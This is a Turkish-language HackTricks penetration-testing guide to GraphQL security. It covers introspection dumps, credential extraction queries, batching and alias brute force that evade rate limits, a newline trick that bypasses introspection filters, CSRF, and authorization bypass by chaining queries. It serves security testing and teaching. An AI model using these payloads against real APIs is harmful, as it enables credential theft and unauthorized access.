# GraphQL

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamınızı görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Tanıtım

GraphQL, **verileri sorgulamak için basitleştirilmiş bir yaklaşım sunarak**, REST API'ye **verimli bir alternatif** olarak vurgulanmaktadır. REST'in aksine, verileri toplamak için genellikle çeşitli uç noktalarda çok sayıda istek gerektiren bir yapıya sahipken, GraphQL tüm gerekli bilgilerin **tek bir istek** aracılığıyla alınmasını sağlar. Bu basitleştirme, veri alım süreçlerinin karmaşıklığını azaltarak **geliştiricilere önemli ölçüde fayda sağlar**.

## GraphQL ve Güvenlik

GraphQL gibi yeni teknolojilerin ortaya çıkmasıyla yeni güvenlik açıkları da ortaya çıkmaktadır. **GraphQL'ın varsayılan olarak kimlik doğrulama mekanizmalarını içermediği** önemli bir noktadır. Bu tür güvenlik önlemlerini uygulamak geliştiricilerin sorumluluğundadır. Doğru kimlik doğrulama olmadan, GraphQL uç noktaları kimlik doğrulanmamış kullanıcılara hassas bilgileri açığa çıkarabilir ve ciddi bir güvenlik riski oluşturabilir.

### Dizin Kaba Kuvvet Saldırıları ve GraphQL

Açığa çıkarılmış GraphQL örneklerini tanımlamak için dizin kaba kuvvet saldırılarında belirli yolların dahil edilmesi önerilir. Bu yollar şunlardır:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Açık GraphQL örneklerinin tanımlanması, desteklenen sorguların incelenmesine olanak tanır. Bu, uç noktadan erişilebilen verileri anlamak için önemlidir. GraphQL'in keşif sistemi, bir şemanın desteklediği sorguları detaylandırarak bunu kolaylaştırır. Bu konuda daha fazla bilgi için GraphQL belgelerindeki keşif bölümüne bakın: [**GraphQL: API'ler için bir sorgu dili.**](https://graphql.org/learn/introspection/)

### Parmak İzi

[**graphw00f**](https://github.com/dolevf/graphw00f) aracı, bir sunucuda kullanılan GraphQL motorunu tespit edebilir ve ardından güvenlik denetçisi için bazı yararlı bilgileri yazdırabilir.

#### Evrensel sorgular <a href="#universal-queries" id="universal-queries"></a>

Bir URL'nin bir GraphQL hizmeti olup olmadığını kontrol etmek için bir **evrensel sorgu**, `query{__typename}`, gönderilebilir. Yanıt `{"data": {"__typename": "Query"}}` içeriyorsa, URL'nin bir GraphQL uç noktası barındırdığını doğrular. Bu yöntem, sorgulanan nesnenin türünü ortaya koyan GraphQL'in `__typename` alanına dayanır.
```javascript
query{__typename}
```
### Temel Numaralandırma

Graphql genellikle **GET**, **POST** (x-www-form-urlencoded) ve **POST**(json) destekler. Güvenlik açısından, CSRF saldırılarını önlemek için yalnızca json'a izin vermek önerilir.

#### İçgörü

Şema bilgilerini keşfetmek için içgörüyü kullanmak için `__schema` alanını sorgulayın. Bu alan tüm sorguların kök türünde mevcuttur.
```bash
query={__schema{types{name,fields{name}}}}
```
Bu sorgu ile kullanılan tüm tiplerin adını bulacaksınız:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Bu sorgu ile tüm tipleri, alanlarını ve argümanlarını (ve argüman türünü) çıkarabilirsiniz. Veritabanını sorgulamanın nasıl yapılacağını bilmek için çok faydalı olacaktır.

![](<../../.gitbook/assets/image (950).png>)

**Hatalar**

**Hataların** gösterilip gösterilmeyeceğini bilmek ilginç olacaktır, çünkü bunlar faydalı **bilgiler** sağlayabilir.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**Yeniden Tanımlama Yoluyla Veritabanı Şemasını Sıralama**

{% hint style="info" %}
Eğer yeniden tanımlama etkinleştirilmişse ancak yukarıdaki sorgu çalışmıyorsa, sorgu yapısından `onOperation`, `onFragment` ve `onField` direktiflerini kaldırmayı deneyin.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Satır içi denetim sorgusu:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Son kod satırı, graphql'den tüm meta bilgileri (nesne adları, parametreler, tipler...) dökecek olan bir graphql sorgusudur.

![](<../../.gitbook/assets/image (363).png>)

Eğer içgörüme izin verilmişse, [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) kullanarak tüm seçenekleri GUI'de görüntüleyebilirsiniz.

### Sorgulama

Veritabanında hangi tür bilgilerin kaydedildiğini bildiğimize göre, **bazı değerler çıkarmayı** deneyelim.

İçgörmede **doğrudan sorgulayabileceğiniz nesneleri** bulabilirsiniz (bir nesneyi sorgulayamazsınız çünkü var olduğu için). Aşağıdaki görüntüde "_queryType_"'ın "_Query_" olarak adlandırıldığını ve "_Query_" nesnesinin alanlarından birinin "_flags_" olduğunu görebilirsiniz, ki bu da bir nesne türüdür. Dolayısıyla bayrak nesnesini sorgulayabilirsiniz.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Sorgunun türü "_flags_" ise "_Flags_"'dir ve bu nesne aşağıdaki gibi tanımlanmıştır:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Görüldüğü gibi, "_Flags_" nesneleri **isim** ve **değer** tarafından oluşturulmuştur. Sonuç olarak bayrakların tüm isimlerini ve değerlerini sorguyla alabilirsiniz:
```javascript
query={flags{name, value}}
```
Not: Eğer sorgulanacak **nesne** bir **ilkel** **tip** gibi **string** ise aşağıdaki örnekte olduğu gibi

![](<../../.gitbook/assets/image (958).png>)

Sadece şu şekilde sorgulayabilirsiniz:
```javascript
query={hiddenFlags}
```
Başka bir örnekte, "_Query_" türü nesnesi içinde 2 nesne olan "_user_" ve "_users_" vardı.\
Bu nesnelerin aramak için herhangi bir argümana ihtiyaç duymadığı durumlarda, istediğiniz verileri sormak suretiyle **tüm bilgileri alabilirsiniz**. Bu örnekte İnternet'ten kaydedilmiş kullanıcı adlarını ve şifreleri çıkarabilirsiniz:

![](<../../.gitbook/assets/image (880).png>)

Ancak, bu örnekte bunu denerseniz şu **hatayı** alırsınız:

![](<../../.gitbook/assets/image (1042).png>)

Görünüşe göre, bir şekilde "_**uid**_" türünde bir argüman kullanarak arama yapacak.\
Neyse ki, zaten [Temel Numaralandırma](graphql.md#basic-enumeration) bölümünde bize gereken tüm bilgileri gösteren bir sorgu önerilmişti: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Eğer o sorguyu çalıştırdığımda sağlanan resmi okursanız, "_**user**_"'ın _Int_ türünde "_**uid**_" adında bir **arg**'ı olduğunu göreceksiniz.

Bu nedenle, hafif bir _**uid**_ bruteforce yaparak _**uid**=**1**_ için bir kullanıcı adı ve şifre elde ettim:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Dikkat edin ki, "_**user**_" ve "_**password**_" parametrelerini isteyebileceğimi **keşfettim** çünkü var olmayan bir şey aramaya çalışırsam (`query={user(uid:1){noExists}}`) bu hatayı alırım:

![](<../../.gitbook/assets/image (707).png>)

Ve **numaralandırma aşaması** sırasında "_**dbuser**_" nesnesinin "_**user**_" ve "_**password**_" alanlarına sahip olduğunu keşfettim.

**Sorgu dizesi dökme hilesi (teşekkürler @BinaryShadow\_)**

Eğer bir String türü ile arama yapabilirseniz, örneğin: `query={theusers(description: ""){username,password}}` ve **boş bir dize ararsanız** tüm verileri dökecektir. (_Bu örnek, öğreticilerin örneğiyle ilgili değildir, bu örnekte "**theusers**" kullanarak "**description**" adında bir String alanıyla arama yapabileceğinizi varsayalım_).

### Arama

Bu yapılandırmada, bir **veritabanı** kişileri ve filmleri içerir. **Kişiler** e-posta ve isimleriyle tanımlanır; filmler ise adları ve derecelendirmeleriyle. **Kişiler** birbirleriyle arkadaş olabilir ve ayrıca filmlere sahip olabilir, veritabanı içindeki ilişkileri gösterir.

Kişileri **isimlerine göre** arayabilir ve e-postalarını alabilirsiniz:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Kişileri **adlarına göre** arayabilir ve **abone oldukları filmleri** alabilirsiniz:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Not alınan kişinin `subscribedMovies`'ın `name`'ini almak için nasıl belirtildiğine dikkat edin.

Aynı zamanda **aynı anda birkaç nesne arayabilirsiniz**. Bu durumda, 2 film araması yapılır:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ya da **farklı nesnelerin ilişkileri kullanılarak takma adlar**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Mutasyonlar

**Mutasyonlar, sunucu tarafında değişiklik yapmak için kullanılır.**

**İntrospeksiyon** içinde **tanımlanmış mutasyonları** bulabilirsiniz. Aşağıdaki görüntüde "_MutationType_" "_Mutation_" olarak adlandırılır ve "_Mutation_" nesnesi mutasyonların isimlerini içerir (bu durumda "_addPerson_" gibi):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Bu yapılandırmada, bir **veritabanı** **kişileri** ve **filmleri** içerir. **Kişiler**, **e-posta** ve **isimleri** ile tanımlanır; **filmler** ise **isim** ve **puanları** ile tanımlanır. **Kişiler** birbirleriyle arkadaş olabilir ve ayrıca filmlere sahip olabilir, veritabanı içindeki ilişkileri gösterir.

Veritabanına **yeni filmler eklemek** için bir mutasyon aşağıdaki gibi olabilir (bu örnekte mutasyon `addMovie` olarak adlandırılmıştır):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Sorguda hem verilerin hem de veri türünün belirtildiğine dikkat edin.**

Ayrıca, veritabanı mevcut **arkadaşlar** ve **filmler** ile ilişkilendirilmiş **kişilerin** oluşturulmasını sağlayan `addPerson` adında bir **mutasyon** işlemini destekler. Arkadaşlar ve filmlerin, bunlara yeni oluşturulan kişiye bağlanmadan önce veritabanında mevcut olması çok önemlidir.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Yönerge Aşırı Yükleme

[**Bu raporda açıklanan zafiyetlerden birinde**](https://www.landh.tech/blog/20240304-google-hack-50000/) belirtildiği gibi, bir yönerge aşırı yükleme, sunucunun işlemleri boşa harcayacak şekilde bir yönergeyi milyonlarca kez çağırmayı içerir, böylece DoS saldırısı yapılabilir hale gelir.

### 1 API isteğinde toplu kaba kuvvet saldırısı

Bu bilgi [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/) adresinden alınmıştır.\
**Farklı kimlik bilgileri ile birlikte birçok sorguyu aynı anda göndererek GraphQL API üzerinden kimlik doğrulama**. Bu klasik bir kaba kuvvet saldırısıdır, ancak şimdi GraphQL toplu işleme özelliği sayesinde HTTP isteği başına birden fazla giriş/şifre çifti göndermek mümkün hale gelmiştir. Bu yaklaşım, harici hız izleme uygulamalarını aldatarak her şeyin yolunda olduğunu ve şifreleri tahmin etmeye çalışan bir botun olmadığını düşündürür.

Aşağıda, **aynı anda 3 farklı e-posta/şifre çifti** ile uygulama kimlik doğrulama isteğinin en basit gösterimi bulunmaktadır. Açıkça aynı şekilde tek bir istekte binlerce göndermek mümkündür:

![](<../../.gitbook/assets/image (1081).png>)

Yanıt ekran görüntüsünden görebileceğimiz gibi, ilk ve üçüncü istekler _null_ döndürdü ve ilgili bilgileri _error_ bölümünde yansıttı. **İkinci mutasyon doğru kimlik doğrulama** verilerine sahipti ve yanıt doğru kimlik doğrulama oturum belirteci içeriyordu.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL İntrospeksiyon Olmadan

Daha fazla **graphql uç noktası introspeksiyonu devre dışı bırakıyor**. Bununla birlikte, graphql beklenmeyen bir istek aldığında fırlattığı hatalar, [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) gibi araçlar için şemayı büyük ölçüde yeniden oluşturmak için yeterlidir.

Ayrıca, Burp Suite uzantısı [**GraphQuail**](https://github.com/forcesunseen/graphquail) **Burp üzerinden geçen GraphQL API isteklerini izler** ve her yeni sorguyu gördüğünde dahili bir GraphQL **şeması oluşturur**. Ayrıca şemayı GraphiQL ve Voyager için açığa çıkarabilir. Uzantı, bir introspeksiyon sorgusu aldığında sahte bir yanıt döndürür. Sonuç olarak, GraphQuail API içinde kullanılabilecek tüm sorguları, argümanları ve alanları gösterir. Daha fazla bilgi için [**buraya bakın**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

[**GraphQL varlıklarını keşfetmek için güzel bir kelime listesi burada bulunabilir**](https://github.com/Escape-Technologies/graphql-wordlist?).

### GraphQL introspeksiyon savunmalarını atlatma <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

API'lerde introspeksiyon sorgularına yönelik kısıtlamaları atlatmak için, `__schema` kelimesinden sonra **özel bir karakter eklemek** etkili olmaktadır. Bu yöntem, introspeksiyonu engellemeyi amaçlayan regex desenlerinde yaygın geliştirici hatalarını sömürür. GraphQL'in görmezden geldiği ancak regex'te hesaba katılmamış olabilecek karakterler ekleyerek, kısıtlamalar atlatılabilir. Örneğin, `__schema`'dan sonra bir satır sonu ekleyen bir introspeksiyon sorgusu, bu tür savunmaları atlayabilir:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Eğer başarısız olursanız, yalnızca POST isteklerine kısıtlamalar uygulanmış olabileceğinden **GET istekleri** veya **`x-www-form-urlencoded` ile POST** gibi alternatif istek yöntemlerini düşünebilirsiniz.

### **Açığa Çıkarılmış GraphQL Yapılarını Keşfetme**

İntrospeksiyon devre dışı bırakıldığında, JavaScript kütüphanelerinde önceden yüklenmiş sorguları incelemek yararlı bir stratejidir. Bu sorgular, geliştirici araçlarındaki `Kaynaklar` sekmesi kullanılarak bulunabilir ve API'nin şeması hakkında bilgi sağlayarak potansiyel olarak **açığa çıkarılmış hassas sorguları** ortaya çıkarabilir. Geliştirici araçları içinde arama yapmak için kullanılan komutlar:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## GraphQL'de CSRF

CSRF nedir bilmiyorsanız aşağıdaki sayfayı okuyun:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Dışarıda, **CSRF tokenları olmadan yapılandırılmış** birkaç GraphQL uç noktası bulabileceksiniz.

GraphQL istekleri genellikle **`application/json`** Content-Type'ı kullanılarak POST istekleri aracılığıyla gönderilir.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Ancak, çoğu GraphQL uç noktası ayrıca **`form-urlencoded` POST isteklerini de destekler:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Bu nedenle, önceki istekler gibi CSRF istekleri **önişlem istekleri olmadan** gönderildiğinden, bir CSRF'yi istismar ederek GraphQL'de **değişiklikler** yapmak mümkündür.

Ancak, Chrome'un `samesite` bayrağının yeni varsayılan çerez değeri `Lax`'tir. Bu, çerezin yalnızca üçüncü taraf web sitelerinden GET isteklerinde gönderileceği anlamına gelir.

Ayrıca, **sorgu isteğinin** genellikle bir **GET** isteği olarak da gönderilebileceğini ve CSRF belirtecinin bir GET isteğinde doğrulanmayabileceğini unutmayın.

Ayrıca, bir [**XS-Search**](../../pentesting-web/xs-search/) **saldırısını** **kullanarak**, kullanıcının kimlik bilgilerini istismar ederek GraphQL uç noktasından içerik sızdırmak mümkün olabilir.

Daha fazla bilgi için [**buradaki orijinal yazıya**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html) **bakın**.

## GraphQL'de Yetkilendirme

Uç noktada tanımlanan birçok GraphQL işlevi, yalnızca istekte bulunanın kimlik doğrulamasını kontrol edebilir ancak yetkilendirmeyi kontrol etmeyebilir.

Sorgu giriş değişkenlerini değiştirmek, hassas hesap ayrıntılarının [sızdırılmasına](https://hackerone.com/reports/792927) neden olabilir.

Mutasyon, başka bir hesap verisini değiştirmeye çalışarak hesap ele geçirmeye bile yol açabilir.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### GraphQL'de Yetkilendirme Atlatma

[Query'leri zincirleme](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln), zayıf bir kimlik doğrulama sisteminin atlatılmasını sağlayabilir.

Aşağıdaki örnekte işlemin "forgotPassword" olduğunu ve yalnızca buna ilişkin forgotPassword sorgusunun yürütülmesi gerektiğini görebilirsiniz. Bu, sona bir sorgu eklenerek atlatılabilir, bu durumda "register" ve sisteme yeni bir kullanıcı olarak kaydedilmesi için bir kullanıcı değişkeni ekliyoruz.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## GraphQL'de Aliases Kullanarak Hız Sınırlarını Atlatma

GraphQL'de, aliases, bir API isteği yapılırken **özelliklerin açıkça adlandırılmasına** olanak tanıyan güçlü bir özelliktir. Bu yetenek, tek bir istekte **aynı türden birden fazla örneği** almak için özellikle kullanışlıdır. Aliases, GraphQL nesnelerinin aynı ada sahip birden fazla özelliğe sahip olmasını engelleyen kısıtlamayı aşmak için kullanılabilir.

GraphQL aliases'lerinin detaylı anlaşılması için aşağıdaki kaynak önerilir: [Aliases](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Aliases'lerin asıl amacı sayısız API çağrısına gerek duymayı azaltmaktır, ancak aliases'lerin, GraphQL uç noktasında kaba kuvvet saldırıları gerçekleştirmek için kullanılabileceği istenmeyen bir kullanım durumu tespit edilmiştir. Bu, bazı uç noktaların, kaba kuvvet saldırılarını sınırlayarak **HTTP isteklerinin sayısını** kısıtlayan hız sınırlayıcılarla korunduğu gerçeğinden kaynaklanmaktadır. Bununla birlikte, bu hız sınırlayıcılar, her istekteki işlemlerin sayısını dikkate almayabilir. Aliases'ler, birden fazla sorgunun tek bir HTTP isteğinde dahil edilmesine izin verdiği için, bu tür hız sınırlama önlemlerini atlayabilir.

Aşağıdaki örnekte, aliased sorguların mağaza indirim kodlarının geçerliliğini doğrulamak için nasıl kullanılabileceğini gösterilmektedir. Bu yöntem, birçok indirim kodunun aynı anda doğrulanmasına izin vererek hız sınırlamayı atlayabilir.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Araçlar

### Güvenlik açığı tarayıcıları

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): GraphQL uç noktalarının yaygın yan yapılandırmalarını test edin
* [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Kullanılan graphql'i parmak izleyin
* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Şemaları yakalamak ve hassas verileri aramak, yetkilendirme testi yapmak, şemaları kaba kuvvet uygulamak ve belirli bir türe giden yolları bulmak için kullanılabilen bir araç seti.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Bağımsız olarak veya [Burp uzantısı](https://github.com/doyensec/inql) olarak kullanılabilir.
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Saldırıları otomatize etmek için CLI istemcisi olarak da kullanılabilir
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Bir GraphQL şemasında belirli bir türe ulaşmanın farklı yollarını listeleyen bir araç.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Gelişmiş GraphQL testi için Burp uzantısı. _**Tarayıcı**_, InQL v5.0'ın çekirdeğidir, burada bir GraphQL uç noktasını veya yerel bir içgörü şema dosyasını analiz edebilirsiniz. Tüm olası sorguları ve mutasyonları otomatik olarak oluşturur ve analiziniz için yapılandırılmış bir görünüme yerleştirir. _**Saldırgan**_ bileşeni, kötü uygulanmış hız sınırlarını atlamak için kullanışlı olabilecek toplu GraphQL saldırıları çalıştırmanıza olanak tanır.

### İstemciler

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI istemcisi
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI İstemcisi

### Otomatik Testler

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQL'i açıklayan video: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Referanslar

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman seviyesine öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) veya [telegram grubuna](https://t.me/peass) katılın veya** bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud github depolarına PR göndererek destekleyin.**

</details>
